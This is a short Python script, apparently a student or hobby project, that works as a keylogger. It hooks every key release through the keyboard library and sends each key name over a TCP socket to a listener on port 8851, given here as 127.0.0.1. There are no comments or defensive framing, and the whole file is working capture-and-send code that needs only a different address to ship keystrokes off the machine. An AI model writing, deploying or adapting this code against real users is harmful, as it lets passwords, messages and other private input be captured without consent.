import socket
import keyboard

port = 8851
my_socket = socket.socket()

def start_log():
    keyboard.on_release(callback=callback)
    keyboard.wait()
    
def callback(event):
    button = event.name
    my_socket.send(button.encode())

def main():
    my_socket.connect(("127.0.0.1", port))
    print("connected")
    start_log()
    my_socket.close()
    print("end")

if __name__ == "__main__":
    main()